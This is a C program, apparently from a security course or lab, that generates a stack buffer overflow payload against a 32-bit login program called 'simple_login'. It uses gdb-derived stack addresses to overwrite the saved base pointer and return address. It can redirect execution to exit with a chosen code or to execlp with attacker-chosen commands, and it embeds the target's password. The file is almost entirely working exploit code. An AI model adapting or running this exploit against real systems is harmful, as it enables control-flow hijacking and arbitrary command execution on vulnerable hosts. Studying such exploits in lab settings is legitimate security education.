// The feature_test_macros(7) are quite entangled, you can actually omit either
// _DEFAULT_SOURCE or _POSIX_C_SOURCE.
#define _DEFAULT_SOURCE  // htole32
#define _POSIX_C_SOURCE 200809L  // stpncpy
#define _XOPEN_SOURCE  // getopt

#include <alloca.h>
#include <assert.h>
#include <ctype.h>  // isspace
#include <endian.h>  // htole32
#include <errno.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>  // strtoul
#include <string.h>  // memset, stpncpy
#include <unistd.h>

_Static_assert(sizeof(uint32_t) == 4, "be sure everything works if we use uint32_t");

/**
 *  The constants were discovered with gdb.
 *
 *  ADDR_PASSWORD:
 *  : password buffer on the stack
 *  ADDR_BASE_POINTER:
 *  : pushed ebp on the stack
 *  ADDR_RETURN_ADDRESS
 *  : pushed return address on the stack
 *  ADDR_END_STACKFRAME
 *  : just after the return address
 */
#define ADDR_PASSWORD       ((uintptr_t)0xffffdb68)
#define ADDR_BASE_POINTER   ((uintptr_t)0xffffdc38)
#define ADDR_RETURN_ADDRESS (ADDR_BASE_POINTER + sizeof(uint32_t))
#define ADDR_END_STACKFRAME (ADDR_RETURN_ADDRESS + sizeof(uint32_t))

_Static_assert(
	ADDR_END_STACKFRAME - ADDR_PASSWORD == 216,
	"we expect the return address to be in the 16 bytes after password"
);

static const char password[] = "AaMilmFS+z11/2J";

static unsigned long parse_ulong(const char *str, int base, unsigned long max, int *error) {
	char *end;
	errno = 0;
	unsigned long ret = strtoul(str, &end, base);
	if(ret == ULONG_MAX && errno != 0) {
		// fall through
	} else if(*end) {
		// trailing characters after integer
		errno = EINVAL;
	} else if(ret > max) {
		errno = ERANGE;
	} else {
		// success
		*error = 0;
		return ret;
	}
	*error = -1;
	return 0;
}

_Static_assert(sizeof(unsigned long) >= sizeof(uint32_t), "unsigned long must be at least as big as uint32_t");

static inline int parse_hex32(uint32_t *result, const char *arg) {
	int error = 0;
	*result = parse_ulong(arg, 16, UINT32_MAX, &error);
	return error;
}

int main(int argc, char **argv) {
	int do_ebp = 0;
	int do_exit = -1;
	int do_exec = 0;
	int correct_password = 0;
	uint32_t ebp = 0;
	for(int opt; (opt = getopt(argc, argv, "b:e::vx")) != -1;) {
		switch(opt) {
		case 'b':
			if(parse_hex32(&ebp, optarg) < 0) {
				fprintf(stderr, "cannot parse %s: %s\n", optarg, strerror(errno));
				goto usage;
			}
			do_ebp = 1;
			break;
		case 'e':
			if(optarg) {
				int error = 0;
				do_exit = parse_ulong(optarg, 0, INT_MAX, &error);
				if(error) {
					fprintf(stderr, "cannot parse %s: %s\n", optarg, strerror(errno));
					goto usage;
				}
			} else {
				do_exit = 0;
			}
			break;
		case 'v':
			correct_password = 1;
			break;
		case 'x':
			do_exec = 1;
			break;
		default:
			goto usage;
		}
	}
	if(optind >= argc) {
		fprintf(stderr, "missing argument: HEX_ADDRESS\n");
		goto usage;
	}

	uint32_t jump_addr = -1;
	if(parse_hex32(&jump_addr, argv[optind]) < 0) {
		fprintf(stderr, "cannot parse %s: %s\n", argv[optind], strerror(errno));
	usage:
		fprintf(stderr, "Usage: %s [-b EBP] [-e[EXIT_CODE]] [-v] HEX_ADDRESS\n", argv[0]);
		fprintf(stderr, "       %s [-b EBP] -x [-v] HEX_ADDRESS COMMAND...\n", argv[0]);
		return 2;
	}
	++optind;

	size_t extra_size = 0;
	if(do_exec) {
		if(optind >= argc) {
			fprintf(stderr, "missing argument: COMMAND\n");
			goto usage;
		}
		// execlp's path arguument, terminating NULL, and return address
		extra_size = 3 * sizeof(uint32_t);
		// size of argv
		for(size_t i = optind; i < (size_t)argc; ++i) {
			extra_size += sizeof(uint32_t);
			extra_size += strlen(argv[i]) + 1;
		}
	} else {
		if(optind + 1 < argc) {
			fprintf(stderr, "unexpected argument: %s\n", argv[optind + 1]);
			goto usage;
		}

		if(do_exit >= 0) {
			// exit's argument and return address
			extra_size = 2 * sizeof(uint32_t);
		}
	}

	// create buffer including return address
	const size_t size = ADDR_END_STACKFRAME - ADDR_PASSWORD;
	char *const buf = alloca(size + extra_size);

	// We must not provide the correct password, simple_login's verify_password
	// must return 0. The return value of verify_password is stored in %eax and
	// by manipulating the return address we jump directly to the unwinding of
	// simple_login's main. Since main also uses %eax for it's return value and
	// we want the simple_login to exit with 0, %eax must be 0 at that point.
	// We can achieve this if verify_password returns 0.
	// Nevertheless we added the command line option '-v' to do just that.
	char *end_of_password = buf;
	if(correct_password) {
		end_of_password = stpncpy(buf, password, size);
		if(end_of_password < buf + size) {
			++end_of_password;
		}
	}
	// Our output must not include a white-space because scanf sucks.
	memset(end_of_password, 'x', buf + size - end_of_password);

	// x86 is little endian, we probably run on the same system, so it is not
	// strictly necessary but still good practice to ensure little endian
	// output.
	uint32_t *const ret = (uint32_t *)(buf + (ADDR_RETURN_ADDRESS - ADDR_PASSWORD));
	*ret = htole32(jump_addr);
	if(do_ebp) {
		uint32_t *const ebp_ptr = (uint32_t *)(buf + (ADDR_BASE_POINTER - ADDR_PASSWORD));
		*ebp_ptr = htole32(ebp);
	}

	if(do_exit >= 0) {
		uint32_t *stack = (uint32_t *)(buf + size);
		// return address
		assert((char *)stack < buf + size + extra_size);
		*stack++ = htole32(-1);
		// exit code
		assert((char *)stack < buf + size + extra_size);
		*stack++ = htole32(do_exit);

		assert((char *)stack == buf + size + extra_size);
	} else if(do_exec) {
		uint32_t *argp = (uint32_t *)(buf + size);
		char *const command = (char *)argp + sizeof(uint32_t) * (argc - optind + 3);
		char *p = command;
		// return address
		*argp++ = htole32(-1);
		// command
		assert((char *)argp < command);
		*argp++ = htole32(ADDR_PASSWORD + (p - buf));
		// argv
		for(size_t i = optind; i < (size_t)argc; ++i) {
			assert((char *)argp < command);
			*argp++ = htole32(ADDR_PASSWORD + (p - buf));

			assert(p < buf + size + extra_size);
			p = stpncpy(p, argv[i], buf + size + extra_size - p);

			assert(p < buf + size + extra_size);
			++p;
		}
		// terminating NULL
		assert((char *)argp < command);
		*argp++ = htole32(0);

		assert((char *)argp == command);
		assert(p == buf + size + extra_size);
	}

	for(char *c = buf; c < buf + size + extra_size; ++c) {
		if(isspace(*c)) {
			fprintf(stderr, "%s: scanf is cursed on so many levels, for some reason it ignores white-space in the input, so your command might not work correctly.\n", argv[0]);
			fprintf(stderr, "%s: \"Input white-space bytes shall be skipped, unless the conversion specification includes a [, c, C, or n conversion specifier.\"\n", argv[0]);
			fprintf(stderr, "%s: https://pubs.opengroup.org/onlinepubs/9799919799/functions/fscanf.html\n", argv[0]);
			break;
		}
	}

	// write the malicious password to standard output
	size_t pending = size + extra_size;
	for(char *p = buf; pending > 0;) {
		ssize_t written = write(STDOUT_FILENO, p, pending);
		if(written < 0) {
			perror("write");
			return 1;
		}
		p += written;
		pending -= written;
	}

	return 0;
}
